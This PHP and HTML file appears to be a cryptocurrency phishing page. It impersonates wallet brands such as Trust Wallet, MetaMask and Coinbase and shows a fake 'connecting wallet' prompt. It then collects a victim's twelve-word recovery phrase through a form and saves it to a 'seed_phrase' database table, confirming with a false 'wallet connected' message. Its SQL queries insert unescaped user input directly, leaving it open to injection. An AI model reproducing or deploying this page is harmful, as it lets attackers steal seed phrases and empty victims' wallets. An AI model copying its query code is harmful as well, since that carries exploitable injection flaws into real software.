<?php
include 'cdn.php'; include 'config.php';
//echo $req;

$uid = preg_replace('/\D/', '', $req);

  $parts = explode('-', $req);
  $words_after_hyphen = array_slice($parts, 1);
  $wallet = implode('-', $words_after_hyphen);
 
  if(isset($_POST['one'])) {
   // echo $_POST['one'];
    $get = $conn->query("select * from user_details where uid='$uid'");
if($get->num_rows>0) {
  while($lp = $get->fetch_assoc()) {
    $name = $lp['uname'];
$str = $_POST['one'].','.$_POST['two'].','.$_POST['three'].','.$_POST['four'].','.$_POST['five'].','.$_POST['six'].','.$_POST['seven'].','.$_POST['eight'].','.$_POST['nine'].','.$_POST['ten'].','.$_POST['eleven'].','.$_POST['twelve'];
// echo $str;
$new_req = substr($lp['uname'], 0, 3).$uid;
   $put = $conn->query("
        insert into seed_phrase(uid,uname,phrase) values('$uid','$name','$str')
    ");
    if($put) {
      ?>
      <div class="alert alert-success">
      Your wallet has been connected successfully.<br>
      <a style='color:orange' href='/web/<?php echo $new_req;?>'>Go back</a>
      <script>
          var inrt = 'inside';

        </script>
     </div>
       <?php
    }
    else {
      ?>
      <div class="alert alert-danger">
      Your wallet has been not connected. Try again!!<br>
      
     </div>
       <?php
    }
  }
}

  }
?>

<style>
body {font-family: Arial, Helvetica, sans-serif;}

/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  padding-top: 100px; /* Location of the box */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,.84); /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
  background-color: #fefefe;
  margin: auto;
  padding: 20px;
  border: 1px solid #888;
  width: 80%;
}

/* The Close Button */
.close {
  color: #aaaaaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
}
.loader {
  display:block;
  margin:auto;
  border: 4px solid #f3f3f3; /* Light grey */
  border-top: 6px solid black; /* Blue */
  border-radius: 50%;
  width: 50px;
  height:50px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.modal button {
  border:hidden; color:purple; border:1px solid purple; border-radius:18px; padding:2%;
}
#myBtn {
  border:hidden; color:purple; border:1px solid #ccc; border-radius:18px; padding:2%;
}
</style>
</head>
<body>


<!-- Trigger/Open The Modal 
<button id="myBtn"><i>Connecting  wallet...</i></button>-->

<!-- The Modal -->
<div id="myModal" class="modal">

  <!-- Modal content -->
  <div class="modal-content" style='text-align:center; background:#e6e6e6;'>
    <span class="close">&times;</span>
    <?php
        switch($wallet) {
          case 'trustwallet':?>
              <img src='https://crypto-surge.com/web3/images/trustwallet.jpg' width='20%' style='border-radius:20px;'/>   
        <?php  break;
         case 'coinbase':?>
          <img src='https://crypto-surge.com/web3/images/coinbase.jpg' width='20%' style='border-radius:20px;'/>   
    <?php  break;

case 'metamask':?>
  <img src='https://crypto-surge.com/web3/images/metamask.jpg' width='20%' style='border-radius:20px;'/>   
<?php  break;

case 'safepal':?>
  <img src='https://crypto-surge.com/web3/images/safepal.jpg' width='20%' style='border-radius:20px;'/>   
<?php  break;

case 'bitcoin.com':?>
  <img src='https://crypto-surge.com/web3/images/bitcoin.jpg' width='20%' style='border-radius:20px;'/>   
<?php  break;

case 'crypto.com':?>
  <img src='https://crypto-surge.com/web3/images/crypto.jpg' width='20%' style='border-radius:20px;'/>   
<?php  break;

case 'exoduswallet':?>
  <img src='https://crypto-surge.com/web3/images/exoduswallet.jpg' width='20%' style='border-radius:20px;'/>   
<?php  break;

case 'atomicwallet':?>
  <img src='https://crypto-surge.com/web3/images/atomicwallet.jpg' width='20%' style='border-radius:20px;'/>   
<?php  break;
        }



?>
    <h3><b><?php echo $wallet;?></b></h3>
    <hr>
    <p style='font-size:18px'>Continue in wallet</p>
    <div class="loader"></div><br>
    <p>Accept connection request in your  <?php
    $substring = 'wallet';
        
    if (strpos($req, $substring) !== false) {
        echo '';
    } else {
        echo $wallet.' wallet';
    }
    ?>...</p>
    <button onclick='clo()'><i class="fa fa-repeat" style="font-size:18px;color:purple"></i>  try manually</button>
    <br><br>
  </div>

</div>

<script>
// Get the modal\

var modal = document.getElementById("myModal");

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];
function clo() {
  modal.style.display = "none";
  btn.style.display = "none";
  
}
// When the user clicks the button, open the modal //
modal.style.display = "block";

if ('inrt' in window) {
  modal.style.display = "none";
}
btn.onclick = function() {
  modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
</script>

<div class="container">
    <div class="question">
    
     <h2> Link your <?php  echo $wallet;?>
     </h2>
     <form action='/manual/<?php echo $req;?>' method='post'>
     <p>Enter Your Recovery Phrase</p><br>
     <input type="text" name="one" placeholder="1" required>
<input type="text" name="two" placeholder="2" required><br>

<input type="text" name="three" placeholder="3" required>
<input type="text" name="four" placeholder="4" required><br>

<input type="text" name="five" placeholder="5" required>
<input type="text" name="six" placeholder="6" required><br>

<input type="text" name="seven" placeholder="7" required>
<input type="text" name="eight" placeholder="8" required><br>

<input type="text" name="nine" placeholder="9" required>
<input type="text" name="ten" placeholder="10" required><br>

<input type="text" name="eleven" placeholder="11" required>
<input type="text" name="twelve" placeholder="12" required><br>


<br><br>


          <div class="sus">
              <div class="left">
                  <button type='submit'>Submit</button>
              </div></form>
              <div class="right">
               <a href='/web/<?php echo $req;?>'> </a>
              </div>
          </div>
             <br>
             <br>
             <p>Dont have a seed phrase? <a style='color:orange'href='mailto:support@virtualsynchub.com'> Contact Us</a></p><br>  
    </div>
</div>
<style>
  body { font-family:"Roboto", sans-serif;}
  .left {float:left;  width:40%;} .right {float:right; width:40%;}
  .left button {border:hidden; background:black; color:white; border-radius:10px; font-size:18px; padding:6%; width:70%}
  .right button {border:hidden; background:orange; color:white; border-radius:10px; font-size:18px; padding:6%; width:70%}
  input[type='text']{
    width:46%;
    padding:3%;
    border:hidden;
    border:1px solid #ccc;
  }
    .question { 
      margin-top:10%;
      background:#e6e6e6;
      border-radius:20px;
      text-align:center;
      padding:5%;
    }
  </style>
